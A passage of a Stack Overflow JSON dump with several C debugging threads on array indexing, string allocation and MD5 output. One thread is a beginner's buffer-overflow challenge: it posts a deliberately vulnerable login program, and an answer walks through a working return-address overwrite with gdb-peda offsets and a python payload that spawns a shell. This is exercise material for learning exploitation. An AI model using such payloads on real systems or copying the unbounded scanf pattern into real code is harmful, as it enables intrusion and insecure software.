"user_type": "moderator", "profile_image": "https://i.stack.imgur.com/Hmfxy.jpg?s=128&g=1", "display_name": "Makyen", "link": "https://stackoverflow.com/users/3773011/makyen"}, "edited": false, "score": 0, "creation_date": 1498091902, "post_id": 44663547, "comment_id": 76360513, "body": "Editing Questions to improve them (e.g. clarification, adding additional information, etc.) <i>is encouraged</i>. However, editing a Question to change it into a different question which results in invalidating an Answer, is against policy. The consensus is that other users should proactively revert such changes. You <i>are encouraged to <a href=\"http://stackoverflow.com/questions/ask\">ask a new Question</a></i>, perhaps with a link to this one for additional context. We want to help, but your new/additional issue needs to be a new Question."}], "answers": [{"tags": [], "owner": {"reputation": 66610, "user_id": 2411320, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5kF5N.jpg?s=128&g=1", "display_name": "gsamaras", "link": "https://stackoverflow.com/users/2411320/gsamaras"}, "is_accepted": false, "score": 0, "last_activity_date": 1497995441, "creation_date": 1497995441, "answer_id": 44663592, "question_id": 44663547, "link": "https://stackoverflow.com/questions/44663547/c-segmentation-fault-when-writing-to-array-pointer-on-raspberry-pi/44663592#44663592", "title": "C: Segmentation Fault when writing to Array Pointer on Raspberry Pi", "body": "<blockquote>\n  <p>Is it how I'm trying to access the array?</p>\n</blockquote>\n\n<p>Yes! Array indexing starts 0 and ends at size - 1, where size is the length of your array.</p>\n\n<hr>\n\n<p>Here:</p>\n\n<pre><code>*(blue+i) = color1[3] + i*blueInc;\n</code></pre>\n\n<p><code>color1</code> is out of range, since it has size of 3:</p>\n\n<pre><code>int color1[3] = {255,0,0};\n</code></pre>\n\n<p>and you access it past <code>color1[2]</code>, which causes <em>Undefined Behavior</em>, and most likely the segmentation fault you are mentioning.</p>\n"}, {"comments": [{"owner": {"reputation": 39, "user_id": 4959689, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-JGNZiHrmdt4/AAAAAAAAAAI/AAAAAAAAACY/HZ71NpRdHBU/photo.jpg?sz=128", "display_name": "calvinjarrod", "link": "https://stackoverflow.com/users/4959689/calvinjarrod"}, "edited": false, "score": 0, "creation_date": 1497998921, "post_id": 44663622, "comment_id": 76313893, "body": "Okay. Can&#39;t believe I missed the off-by-one error. That&#39;s corrected. However it works on my Linux machine. Its just supposed to make a status bar with different colors for each bar increment. But when I compile it on my Raspberry Pi, it seg faults."}, {"owner": {"reputation": 1213, "user_id": 8134032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b185eace7b99bb80d233c6d9d8fc308?s=128&d=identicon&r=PG&f=1", "display_name": "jacoblaw", "link": "https://stackoverflow.com/users/8134032/jacoblaw"}, "reply_to_user": {"reputation": 39, "user_id": 4959689, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-JGNZiHrmdt4/AAAAAAAAAAI/AAAAAAAAACY/HZ71NpRdHBU/photo.jpg?sz=128", "display_name": "calvinjarrod", "link": "https://stackoverflow.com/users/4959689/calvinjarrod"}, "edited": false, "score": 0, "creation_date": 1497999451, "post_id": 44663622, "comment_id": 76314058, "body": "@calvinjarrod As mentioned in other answers, indexing past the end of the array is undefined behavior. So sometimes it will not crash your program, but that doesn&#39;t mean it&#39;s working as you intend. This might have to do with your variable <code>range</code>. I&#39;m looking in the post and you don&#39;t provide the definition of it. You say &quot;...In the main loop&quot;. If <code>range</code> is always the same value, I recommend <code>#define</code>ing it. Have you tried stepping through the code with a debugger?"}], "tags": [], "owner": {"reputation": 1213, "user_id": 8134032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b185eace7b99bb80d233c6d9d8fc308?s=128&d=identicon&r=PG&f=1", "display_name": "jacoblaw", "link": "https://stackoverflow.com/users/8134032/jacoblaw"}, "is_accepted": false, "score": 2, "last_activity_date": 1497995596, "creation_date": 1497995596, "answer_id": 44663622, "question_id": 44663547, "link": "https://stackoverflow.com/questions/44663547/c-segmentation-fault-when-writing-to-array-pointer-on-raspberry-pi/44663622#44663622", "title": "C: Segmentation Fault when writing to Array Pointer on Raspberry Pi", "body": "<p>C is zero indexed, meaning if you have an array 3 ints long, you access it with indices 0, 1 and 2</p>\n\n<p>example:</p>\n\n<pre><code>int ex[3] = {1,2,3};\nprintf(\"%d %d %d\", ex[0], ex[1], ex[2]);\n</code></pre>\n\n<p>will output:</p>\n\n<pre><code>1 2 3\n</code></pre>\n\n<p>So, what you need to do, is go over your code and check where you are indexing arrays improperly, which looks like all of them inside the function <code>void setColor(int color1[3],int color2[3], int *red, int *green, int *blue)</code></p>\n"}, {"tags": [], "owner": {"reputation": 23, "user_id": 8163011, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c00d724848344b2f07e5843e98b52da9?s=128&d=identicon&r=PG&f=1", "display_name": "Gonzalo Fuentes", "link": "https://stackoverflow.com/users/8163011/gonzalo-fuentes"}, "is_accepted": false, "score": 0, "last_activity_date": 1500145575, "last_edit_date": 1500145575, "creation_date": 1497995684, "answer_id": 44663636, "question_id": 44663547, "link": "https://stackoverflow.com/questions/44663547/c-segmentation-fault-when-writing-to-array-pointer-on-raspberry-pi/44663636#44663636", "title": "C: Segmentation Fault when writing to Array Pointer on Raspberry Pi", "body": "<p>As you intialized the <code>array</code> <code>color1[3]</code>, the indexes you can use are <code>0</code>, <code>1</code>, and <code>2</code>, so you should change that values, because when you try to access the position <code>3</code> in the <code>array</code>, it gives a segmentation fault, because it is out of index. \nHope you understand!</p>\n"}], "owner": {"reputation": 39, "user_id": 4959689, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-JGNZiHrmdt4/AAAAAAAAAAI/AAAAAAAAACY/HZ71NpRdHBU/photo.jpg?sz=128", "display_name": "calvinjarrod", "link": "https://stackoverflow.com/users/4959689/calvinjarrod"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 279, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1500145575, "creation_date": 1497995192, "last_edit_date": 1497998411, "question_id": 44663547, "link": "https://stackoverflow.com/questions/44663547/c-segmentation-fault-when-writing-to-array-pointer-on-raspberry-pi", "title": "C: Segmentation Fault when writing to Array Pointer on Raspberry Pi", "body": "<p>I'm trying to write to an element in a color array via a pointer in a function. The function is:</p>\n\n<pre><code>void setColor(int color1[3],int color2[3], int *red, int *green, int *blue) {\nint redInc = (color2[1]-color1[1])/range;\nint greenInc = (color2[2]-color1[2])/range;\nint blueInc = (color2[3]-color1[3])/range;\n\nint i = 0;\nwhile (i &lt; range) {\n    *(red+i) = color1[1] + i*redInc;\n    printf(\"This is red: %s\\n\",*(red+i));\n    *(green+i) = color1[2] + i*greenInc;\n    *(blue+i) = color1[3] + i*blueInc;\n    i++;\n}\nreturn;}     \n</code></pre>\n\n<p>Range is defined as a constant of 21. Inside of the main loop:</p>\n\n<pre><code>int color1[3] = {255,0,0};\nint color2[3] = {0,255,0};\n\nint red[21] = {0};\nint green[21] = {0};\nint blue[21] = {0};\n\nsetColor(color1,color2,red,green,blue);\n</code></pre>\n\n<p>I've tried this code on my Linux machine and it seems to work, but it Seg Faults on my Raspberry Pi. Is it how I'm trying to access the array?</p>\n"}, {"tags": ["c", "arrays", "string", "memory-management", "io"], "comments": [{"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 10, "creation_date": 1497991203, "post_id": 44662565, "comment_id": 76310895, "body": "<code>char * string = malloc(sizeof(char));</code> you are allocating space for a single <code>char</code> - so if you try to write more than that (in <code>scanf(&quot;%s&quot;, string);</code>) you already get <i>undefined behavior</i>"}, {"owner": {"reputation": 1063, "user_id": 6392769, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/d77f31991542957621c0140eba8353e7?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/6392769/martin"}, "reply_to_user": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 0, "creation_date": 1497991273, "post_id": 44662565, "comment_id": 76310925, "body": "So i should allocate it like that: <code>char * string = malloc(100* sizeof(char));</code> ?"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 0, "creation_date": 1497991313, "post_id": 44662565, "comment_id": 76310948, "body": "@UnholySheep how about <code>scanf(&quot;%0s&quot;, string);</code> or <code>scanf(&quot;%*s&quot;, string);</code> that would be safe if <code>string[0]=&#39;\\0&#39;;</code> is called first :)"}, {"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 1, "creation_date": 1497991494, "post_id": 44662565, "comment_id": 76311047, "body": "Yes, you need to allocate more - 100 should be enough. Also note that in this particular code you don&#39;t actually need to use <code>malloc</code> and <code>free</code>, you could just declare a <code>char</code> array (e.g.: <code>char string[100];</code>)"}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 2, "creation_date": 1497991508, "post_id": 44662565, "comment_id": 76311057, "body": "string[n+1]--&gt;string[n-1]...also you have allocated only 1 byte for string variable."}, {"owner": {"reputation": 1063, "user_id": 6392769, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/d77f31991542957621c0140eba8353e7?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/6392769/martin"}, "edited": false, "score": 0, "creation_date": 1497991604, "post_id": 44662565, "comment_id": 76311102, "body": "Yeah Vidor you&#39;ve saved me."}, {"owner": {"reputation": 571, "user_id": 7450836, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/69c0cbc84d95b5201e2f5999106119ca?s=128&d=identicon&r=PG&f=1", "display_name": "nounoursnoir", "link": "https://stackoverflow.com/users/7450836/nounoursnoir"}, "edited": false, "score": 0, "creation_date": 1497991882, "post_id": 44662565, "comment_id": 76311225, "body": "You may not know the dangers of <code>scanf</code>. If you don&#39;t, I suggest you read this: <a href=\"http://sekrit.de/webdocs/c/beginners-guide-away-from-scanf.html\" rel=\"nofollow noreferrer\">sekrit.de/webdocs/c/beginners-guide-away-from-scanf.html</a>"}, {"owner": {"reputation": 1063, "user_id": 6392769, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/d77f31991542957621c0140eba8353e7?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/6392769/martin"}, "edited": false, "score": 0, "creation_date": 1497991981, "post_id": 44662565, "comment_id": 76311272, "body": "Yea, but I do it only for exams. I do not plan to be C programmer."}, {"owner": {"reputation": 13397, "user_id": 2287576, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/iCua4.jpg?s=128&g=1", "display_name": "Andrew Truckle", "link": "https://stackoverflow.com/users/2287576/andrew-truckle"}, "edited": false, "score": 0, "creation_date": 1498061255, "post_id": 44662565, "comment_id": 76346617, "body": "Don&#39;t you want n-1? It is zero based index. So position 5 is actually index 4."}], "answers": [{"comments": [{"owner": {"reputation": 1063, "user_id": 6392769, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/d77f31991542957621c0140eba8353e7?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/6392769/martin"}, "edited": false, "score": 1, "creation_date": 1497991803, "post_id": 44662667, "comment_id": 76311185, "body": "Thank you for your effort."}, {"owner": {"reputation": 66610, "user_id": 2411320, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5kF5N.jpg?s=128&g=1", "display_name": "gsamaras", "link": "https://stackoverflow.com/users/2411320/gsamaras"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1497992298, "post_id": 44662667, "comment_id": 76311424, "body": "@BLUEPIXY I was just about to update with exactly what you did, you are an angel."}, {"owner": {"reputation": 941, "user_id": 6061216, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/sRsZ4.png?s=128&g=1", "display_name": "DevilaN", "link": "https://stackoverflow.com/users/6061216/devilan"}, "edited": false, "score": 1, "creation_date": 1497992445, "post_id": 44662667, "comment_id": 76311503, "body": "@gsamaras Better :)"}], "tags": [], "owner": {"reputation": 66610, "user_id": 2411320, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5kF5N.jpg?s=128&g=1", "display_name": "gsamaras", "link": "https://stackoverflow.com/users/2411320/gsamaras"}, "is_accepted": true, "score": 5, "last_activity_date": 1497992183, "last_edit_date": 1497992183, "creation_date": 1497991444, "answer_id": 44662667, "question_id": 44662565, "link": "https://stackoverflow.com/questions/44662565/print-one-character-from-string/44662667#44662667", "title": "Print one character from string", "body": "<p>There is no need for dynamic allocation here, since you do not know the length of the string in advance, so just do:</p>\n\n<pre><code>void printLetter() {\n    char string[100]; // example size 100\n    ...\n    scanf(\"%99s\", string); // read no more than your array can hold\n}\n</code></pre>\n\n<p>A fun exercise would be to count the length of the string, allocate dynamically exactly as mush space as you need (+1 for the null terminator), copy <code>string</code> to that dynamically allocated space, use it as you wish, and then free it.</p>\n\n<hr>\n\n<p>Moreover this:</p>\n\n<pre><code>printf(\"%c\\n\", string[n+1]);\n</code></pre>\n\n<p>should be written as this:</p>\n\n<pre><code>printf(\"%c\\n\", string[n-1]);\n</code></pre>\n\n<p>since you do not want to go out bounds of your array (and cause <em>Undefined Behavior</em>), or print two characters next of the requested character, since when I ask for the 1st character, you should print <code>string[0]</code>, when I ask for the 2nd, you should print <code>string[1]</code>, and so on. So you see why we need to print <code>string[n-1]</code>, when the user asks for the <code>n</code>-th letter.</p>\n\n<p>By the way, it's common to use a variable named <code>i</code>, and not <code>n</code> as in your case, when dealing with an <em>i</em>ndex. ;)</p>\n\n<hr>\n\n<p>In your code, this:</p>\n\n<pre><code>char * string = malloc(sizeof(char));\n</code></pre>\n\n<p>allocates memory for <em>just one character</em>, which is no good, since even if the string had one letter only, where would you put the null terminator? You know that strings in C should (almost) always be <code>NULL</code> terminated.</p>\n\n<p>In order to allocate dynamically memory for a string of size <code>N</code>, you should do:</p>\n\n<pre><code>char * string = malloc((N + 1) * sizeof(char));\n</code></pre>\n\n<p>where you allocate space for <code>N</code> characters, plus 1 for the <code>NULL</code> terminator.</p>\n"}, {"comments": [{"owner": {"reputation": 941, "user_id": 6061216, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/sRsZ4.png?s=128&g=1", "display_name": "DevilaN", "link": "https://stackoverflow.com/users/6061216/devilan"}, "edited": false, "score": 0, "creation_date": 1497992192, "post_id": 44662673, "comment_id": 76311369, "body": "Why using malloc if you can just declare char string[100]; ? What will happen when string is more than 100 characters long?"}, {"owner": {"reputation": 5773, "user_id": 3525545, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Rge03.jpg?s=128&g=1", "display_name": "Mahonri Moriancumer", "link": "https://stackoverflow.com/users/3525545/mahonri-moriancumer"}, "reply_to_user": {"reputation": 941, "user_id": 6061216, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/sRsZ4.png?s=128&g=1", "display_name": "DevilaN", "link": "https://stackoverflow.com/users/6061216/devilan"}, "edited": false, "score": 1, "creation_date": 1497992424, "post_id": 44662673, "comment_id": 76311493, "body": "@DevilaN, There are many things I would do to bring this code up to my standards.  Unfortunately, by then, there would be little resemblance to the question code.  I think it is best to make minimal changes, sufficient to get the code operational without getting into the problems of scant(), buffer sizes, etc."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1497994702, "post_id": 44662673, "comment_id": 76312482, "body": "Detail: &quot;sizeof(char) is generally 1 byte.&quot;  In C, it is always 1 byte, as C defined a <i>byte</i>"}], "tags": [], "owner": {"reputation": 5773, "user_id": 3525545, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Rge03.jpg?s=128&g=1", "display_name": "Mahonri Moriancumer", "link": "https://stackoverflow.com/users/3525545/mahonri-moriancumer"}, "is_accepted": false, "score": 1, "last_activity_date": 1497991777, "last_edit_date": 1497991777, "creation_date": 1497991468, "answer_id": 44662673, "question_id": 44662565, "link": "https://stackoverflow.com/questions/44662565/print-one-character-from-string/44662673#44662673", "title": "Print one character from string", "body": "<p>Couple of problems...</p>\n\n<p>sizeof(char) is generally 1 byte.  Hence malloc() is allocating only one byte of memory to string.  Perhaps a larger block of memory is required?  \"Martin\", for example, will require at least 6 bytes, plus the string termination character (seven bytes total).</p>\n\n<p>printf(\"%c\\n\", string[n+1]) is perhaps not quite right...</p>\n\n<pre><code>  String: Martin\\0\n  strlen= 6\n  Offset: 0123456\n  n = 5... [n+1] = 6\n  The character being output is the string terminator '\\0' at index 6.\n</code></pre>\n\n<p>This might work better:</p>\n\n<pre><code>  void printLetter() {\n\n      char * string = malloc(100 * sizeof(char));\n      int n;\n\n      printf(\"Number:\\n\");\n      scanf(\"%i\", &amp;n);\n      printf(\"String:\\n\");\n      scanf(\"%s\", string);\n\n      if(n &gt; strlen(string)) {\n          printf(\"nothing\");\n      } else {\n          printf(\"%c\\n\", string[n-1]);\n      }\n\n   free(string);\n\n\n  }\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 941, "user_id": 6061216, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/sRsZ4.png?s=128&g=1", "display_name": "DevilaN", "link": "https://stackoverflow.com/users/6061216/devilan"}, "is_accepted": false, "score": -1, "last_activity_date": 1497991565, "creation_date": 1497991565, "answer_id": 44662704, "question_id": 44662565, "link": "https://stackoverflow.com/questions/44662565/print-one-character-from-string/44662704#44662704", "title": "Print one character from string", "body": "<p>You are facing buffer overflow.\nTake a look to this question, so it will show you how to manage your memory properly in such situation: <a href=\"https://stackoverflow.com/questions/1621394/how-to-prevent-scanf-causing-a-buffer-overflow-in-c\">How to prevent scanf causing a buffer overflow in C?</a></p>\n\n<p>Alternatively you can ask for number of letter and allocate only that much memory + 1. Then <code>fgets(string, n,stdin);</code> because you don't need rest of the string :-)</p>\n"}], "owner": {"reputation": 1063, "user_id": 6392769, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/d77f31991542957621c0140eba8353e7?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/6392769/martin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4832, "favorite_count": 0, "accepted_answer_id": 44662667, "answer_count": 3, "score": 2, "last_activity_date": 1497992183, "creation_date": 1497991073, "last_edit_date": 1497992075, "question_id": 44662565, "link": "https://stackoverflow.com/questions/44662565/print-one-character-from-string", "title": "Print one character from string", "body": "<p>I'm facing an issue connected with printing one char from string in c.\nThe function takes from users two variables - number (number which should print character from string) and string. When I put as a string \"Martin\" and number is 5 then the output is \"i\". But when the number is larger than the string length something goes wrong and I actually don't know what's wrong. </p>\n\n<p>PS. If the number is longer than string size it should print \"Nothing\".</p>\n\n<pre><code>void printLetter() {\n\n    char * string = (char*)malloc(sizeof(char));\n    int n;\n\n    printf(\"Number:\\n\");\n    scanf(\"%i\", &amp;n);\n    printf(\"String:\\n\");\n    scanf(\"%s\", string);\n\n    if(n &gt; strlen(string)) {\n        printf(\"nothing\");\n    } else {\n        printf(\"%c\\n\", string[n+1]);\n    }\n\n    free(string);\n\n\n} \n</code></pre>\n"}, {"tags": ["c", "gcc", "buffer", "buffer-overflow"], "answers": [{"tags": [], "owner": {"reputation": 786, "user_id": 2993875, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20d32b034d21b3a9e176728210846add?s=128&d=identicon&r=PG&f=1", "display_name": "sinkmanu", "link": "https://stackoverflow.com/users/2993875/sinkmanu"}, "is_accepted": false, "score": 0, "last_activity_date": 1499257372, "creation_date": 1499257372, "answer_id": 44926189, "question_id": 44662487, "link": "https://stackoverflow.com/questions/44662487/buffer-overflow-linux-64bit/44926189#44926189", "title": "Buffer overflow - linux 64bit", "body": "<p>It is a simple buffer overflow, as you can see the buffer overflow happens in the <strong>scanf</strong> function:</p>\n\n<pre><code>  char buffer[33] = {0};\n\n  puts(\"Enter your password:\");\n  fflush(stdout);\n  scanf(\"%s\", buffer);\n</code></pre>\n\n<p>To exploit it, first you should know the offset to overwrite the instruction program (RIP) and get the execution control, </p>\n\n<p>I use gdb + PEDA:</p>\n\n<pre><code>gdb-peda$ pattern create 100 input\ngdb-peda$ r &lt; input\n...\ngdb-peda$ patts\nRegisters contain pattern buffer:\nRBP+0 found at offset: 48\nRegisters point to pattern buffer:\n[RSP] --&gt; offset 56 - size ~44\n...\n</code></pre>\n\n<p>Now, we have the offset to exploit the buffer overflow. So, we can get the EIP control.</p>\n\n<pre><code>[manu@debian /tmp]$ python -c 'print \"A\"*56+\"BBBBBBBB\"' &gt; input\n\n\ngdb-peda$ r &lt; input\n...\n   0x4008b7 &lt;check_passwd+174&gt;: leave  \n=&gt; 0x4008b8 &lt;check_passwd+175&gt;: ret \n...    \n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffe248 (\"BBBBBBBB\")\n</code></pre>\n\n<p>We know that when the ret instruction is called, the EIP will be the address in the top of the stack. So, we change te address by <em>0x4007f9</em> and run the shell.</p>\n\n<pre><code>[manu@debian /tmp]$ readelf -s bof\n...\n    60: 0000000000600ee0     0 NOTYPE  GLOBAL DEFAULT   24 __data_start\n    61: 00000000004007f9    16 FUNC    GLOBAL DEFAULT   13 runShell\n    62: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__\n...\n\n[manu@debian /tmp]$ python -c 'print \"A\"*56+\"\\xf9\\x07\\x40\\x00\\x00\\x00\\x00\\x00\"' &gt; input\n[manu@debian /tmp]$ (cat input;cat) | ./bof \n\nBUFFER OVER FLOW TEST\n\nEnter your password:\nrunShell @ 0x4007f9\nid\nuid=1000(manu) gid=1000(manu) grupos=1000(manu),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),119(bluetooth)\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 8146088, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d0ada9b9e73f1c8614320dbd09f81c12?s=128&d=identicon&r=PG&f=1", "display_name": "Florent distefano", "link": "https://stackoverflow.com/users/8146088/florent-distefano"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 671, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1499257372, "creation_date": 1497990729, "last_edit_date": 1498025714, "question_id": 44662487, "link": "https://stackoverflow.com/questions/44662487/buffer-overflow-linux-64bit", "title": "Buffer overflow - linux 64bit", "body": "<p>I have been working on a test program for the <strong>\"buffer overflow linux 64bit\"</strong> challenge. When launching the program, it prompts for a password. </p>\n\n<p>The purpose is to exploit a <strong>buffer overflow</strong> fault at the password field to access the shell part. As I am a beginner in this field. I went to follow some tutorial on the net. I fell several times on this site before and during my research to better understand the source code found in <code>main.c</code> also in the link below. </p>\n\n<p>I use <strong>GDB</strong> and <strong>objdump</strong> on Linux for breakpoints and disassembly.</p>\n\n<p><strong>Findings/Steps taken:</strong> </p>\n\n<ul>\n<li>The password entered is stored in <code>RSP</code> when I do the conversion of\nthe shell address, which is of the kind on my PC <code>0x555555559bd</code> in\nASCII.</li>\n<li>Then, I invert all I get: <code>\u00bdIUUUU</code>.  </li>\n<li>When I enter this value as a password, I get address <code>0x555555559bd</code> exactly in  <code>RSP</code> registry.  </li>\n<li>I also know that I can crush the value of <code>RBP</code> by typing for example: <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u00bdIUUUU</code>. </li>\n<li>The address is written <code>\"\u00bdIUUUU\"</code> in <code>RBP</code>.</li>\n</ul>\n\n<p><strong>Question:</strong> That's where I'm blocked I would just like to know what kind of injection I could do to do a jump at address <code>0x9bd</code>?</p>\n\n<p>Here is the file containing the source code and the cc command:\n<strong><a href=\"http://mtnb.be/test_login_overflow.rar\" rel=\"nofollow noreferrer\">http://mtnb.be/test_login_overflow.rar</a></strong>.</p>\n\n<p><strong>Code:</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n\n#define BANNER \"\\n\\\nBUFFER OVER FLOW TEST\\n\\\n\"\n\nchar passwd[33] = {0};\n\nvoid readPasswd(){\n  FILE *file = fopen(\"/home/user/passwd\", \"r\");\n  if (!file){\n    puts(\"ERROR: Unable to read /home/user/passwd\");\n    exit(1);\n  }\n  fread(passwd, 1, 32, file);\n}\n\nvoid runShell()\n{\n  system(\"bash\");\n}\n\n\nint check_passwd(){\n  char debug = 0;\n  char buffer[33] = {0};\n\n  puts(\"Enter your password:\");\n  fflush(stdout);\n  scanf(\"%s\", buffer);\n\n  if (debug){\n    printf(\"runShell @ %p\\n\", runShell);\n    fflush(stdout);\n  }\n  if (strncmp(passwd, buffer, 32))\n    return 0;\n  else\n    return 1;\n}\n\nvoid login()\n{\n  while (1){\n    if (check_passwd())\n      break;\n    puts(\"Invalid password !\");\n    fflush(stdout);\n  }\n  puts(\"Welcome admin, here is your shell !\");\n  fflush(stdout);\n  runShell();\n}\n\nint main()\n{\n  char passwd[33] = {0};\n  puts(BANNER);\n  fflush(stdout);\n  readPasswd();\n  login();\n\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "hash", "openssl", "md5"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 4, "creation_date": 1497990743, "post_id": 44662454, "comment_id": 76310615, "body": "you&#39;re returning a reference to a local variable... then you&#39;re printing it as an hex integer..."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1497990840, "post_id": 44662454, "comment_id": 76310683, "body": "<code>printf(&quot;%02x&quot;, res);</code> ? Are you sure you are actually getting the output from the code presented? Do you know, MD5 hash is 16 byte long?"}, {"owner": {"reputation": 846, "user_id": 3301488, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/35848d5d02b8a0b12b9cdc979f88a370?s=128&d=identicon&r=PG&f=1", "display_name": "saruftw", "link": "https://stackoverflow.com/users/3301488/saruftw"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1497990878, "post_id": 44662454, "comment_id": 76310711, "body": "@Jean-Fran&#231;oisFabre how to go about it then?"}, {"owner": {"reputation": 846, "user_id": 3301488, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/35848d5d02b8a0b12b9cdc979f88a370?s=128&d=identicon&r=PG&f=1", "display_name": "saruftw", "link": "https://stackoverflow.com/users/3301488/saruftw"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1497991100, "post_id": 44662454, "comment_id": 76310830, "body": "@EugeneSh. I&#39;m aware of that, however for this example I wanted to avoid a <code>for</code> loop and just check for initial patterns."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, 